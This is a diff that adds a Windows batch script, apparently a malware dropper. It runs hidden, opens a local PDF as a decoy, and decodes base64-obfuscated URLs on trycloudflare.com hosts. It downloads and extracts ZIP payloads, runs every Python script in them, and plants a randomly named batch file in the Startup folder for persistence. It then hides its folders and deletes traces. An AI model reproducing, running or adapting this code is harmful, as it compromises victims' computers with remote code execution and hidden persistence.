@@ -1,0 +1,151 @@
+ÿþ&cls
+@echo off
+:: Run minimized
+if "%1" neq "hidden" (
+    powershell -windowstyle hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
+    exit /b
+)
+
+setlocal enabledelayedexpansion
+
+:::::::::::::::::::::::::::::::::
+:: PDF SEARCH FUNCTIONALITY
+:::::::::::::::::::::::::::::::::
+echo Searching for PDF files in Downloads and Documents folders...
+set "pdfFile="
+
+for /r "%USERPROFILE%\Downloads" %%f in (*.pdf) do (
+    if not defined pdfFile (
+        set "pdfFile=%%f"
+    )
+)
+
+if not defined pdfFile (
+    for /r "%USERPROFILE%\Documents" %%f in (*.pdf) do (
+        if not defined pdfFile (
+            set "pdfFile=%%f"
+        )
+    )
+)
+
+if defined pdfFile (
+    echo Found PDF: !pdfFile!
+    start "" "!pdfFile!"
+    timeout /t 3 >nul
+) else (
+    echo No PDF files found. Continuing...
+)
+
+:: ----------------------------
+:: 1. Generate Random ZIP Names
+:: ----------------------------
+set "CHARS=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+call :genRand RANDZIP
+call :genRand RANDSTZIP
+call :genRand RANDSTARTUP
+:::::::::::::::::::::::::::::::::
+:: WEBDAV DOWNLOAD & EXTRACT
+:::::::::::::::::::::::::::::::::
+:: Base64 encoded URLs
+set "zip85=aHR0cHM6Ly9zeW5kaWNhdGUtamV0LWNhc2gtbW90aGVyYm9hcmQudHJ5Y2xvdWRmbGFyZS5jb20vUGhTZXAzME1haW5ycS56aXA="
+set "zip85f=aHR0cHM6Ly9kZWRpY2F0ZWQtc20tYm9vbGVhbi1zb2MudHJ5Y2xvdWRmbGFyZS5jb20vMDgxMU1haW5ycS56aXA="
+
+set "msvp85=aHR0cHM6Ly9zeW5kaWNhdGUtamV0LWNhc2gtbW90aGVyYm9hcmQudHJ5Y2xvdWRmbGFyZS5jb20vUGhTZXAzMFN0YXJxcS56aXA="
+set "msvp85f=aHR0cHM6Ly9kZWRpY2F0ZWQtc20tYm9vbGVhbi1zb2MudHJ5Y2xvdWRmbGFyZS5jb20vMDgxMVN0YXJxcS56aXA="
+
+set "WEBDAV_FILE=aHR0cHM6Ly9zeW5kaWNhdGUtamV0LWNhc2gtbW90aGVyYm9hcmQudHJ5Y2xvdWRmbGFyZS5jb20vUGhTZXAzMFNmc2EuYmF0"
+set "WEBDAV_FILEf=aHR0cHM6Ly9kZWRpY2F0ZWQtc20tYm9vbGVhbi1zb2MudHJ5Y2xvdWRmbGFyZS5jb20vMDgxMVN0YXJxcS5iYXQ="
+
+:: Paths
+set "DESTZIP=%USERPROFILE%\Contacts\!RANDZIP!.zip"
+set "STDESTZIP=%USERPROFILE%\Contacts\!RANDSTZIP!.zip"
+set "EXTRACTTO=%USERPROFILE%\Contacts\3DAus"
+set "DESTDIRSTR=%USERPROFILE%\Contacts\3DSObi"
+set "STARTUPBAT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\!RANDSTARTUP!.bat"
+set "PYTHONW=%EXTRACTTO%\python312x64\python.exe"
+set "PYTHONWBox=%EXTRACTTOVid%\python312x32\python.exe"
+set "memb=%USERPROFILE%\Contacts\tyla.bat"
+set "onef=%USERPROFILE%\Contacts\tyla.tar"
+
+:: Create directories
+if not exist "%DESTDIRSTR%" mkdir "%DESTDIRSTR%"
+
+:: Download ZIP Main (primary -> fallback)
+echo Downloading ZIP file...
+powershell -NoProfile -Command "try { irm ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%zip85%'))) -OutFile '%DESTZIP%' -ErrorAction Stop } catch { irm ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%zip85f%'))) -OutFile '%DESTZIP%' }"
+
+if not exist "%DESTZIP%" (
+    echo Failed to download the ZIP file.
+    exit /b 1
+)
+
+:: Extract ZIP
+echo Extracting ZIP file...
+powershell -NoProfile -Command "try { Expand-Archive -Path '%DESTZIP%' -DestinationPath '%EXTRACTTO%' -Force } catch { exit 1 }"
+
+if errorlevel 1 (
+    echo Failed to extract the ZIP file.
+    exit /b 1
+)
+echo ZIP extraction complete.
+
+:: Run all Python scripts dynamically from extracted Python312 folder
+if exist "%PYTHONW%" (
+    for %%f in ("%EXTRACTTO%\python312x64\*.py") do (
+        start "" /b "%PYTHONW%" "%%f"
+    )
+)
+
+:: Step 4: Download startup file (with fallback)
+echo [*] Downloading startup file...
+powershell -NoProfile -Command "try { irm ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%WEBDAV_FILE%'))) -OutFile '%STARTUPBAT%' -ErrorAction Stop } catch { irm ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%WEBDAV_FILEf%'))) -OutFile '%STARTUPBAT%' }"
+
+if exist "%STARTUPBAT%" (
+    echo [+] Startup file installed successfully.
+) else (
+    echo [!] ERROR: Failed to install startup file.
+)
+
+:: Download & extract MSVP file (with fallback)
+echo Downloading MSVP file...
+powershell -NoProfile -Command "try { irm ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%msvp85%'))) -OutFile '%STDESTZIP%' -ErrorAction Stop } catch { irm ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%msvp85f%'))) -OutFile '%STDESTZIP%' }"
+
+if not exist "%STDESTZIP%" (
+    echo Failed to download MSVP file.
+) else (
+    echo Extracting MSVP ZIP file...
+    powershell -NoProfile -Command "try { Expand-Archive -Path '%STDESTZIP%' -DestinationPath '%DESTDIRSTR%' -Force } catch { exit 1 }"
+    if errorlevel 1 (
+        echo Failed to extract MSVP ZIP file.
+    )
+)
+
+:: Cleanup
+if exist "%DESTZIP%" del "%DESTZIP%"
+if exist "%STDESTZIP%" del "%STDESTZIP%"
+if exist "%DESTZIPVid%" del "%DESTZIPVid%"
+if exist "%onef%" del "%onef%"
+
+timeout /t 2 >nul
+attrib +h "%EXTRACTTO%"
+rmdir /s /q "%USERPROFILE%\Contacts\3DAus"
+
+:: Hide folders and delete temp files
+attrib +h "%EXTRACTTOVid%"
+attrib +h "%DESTDIRSTR%"
+if exist "%onef%" del /f /q "%onef%"
+if exist "%memb%" del "%memb%"
+goto :eof
+
+:: ----------------------------
+:: Function: genRand
+:: ----------------------------
+:genRand
+setlocal enabledelayedexpansion
+set "OUT="
+for /L %%i in (1,1,5) do (
+    set /a RND=!random! %% 26
+    for %%a in (!RND!) do set "OUT=!OUT!!CHARS:~%%a,1!"
+)
+endlocal & set "%~1=%OUT%"
+goto :eof
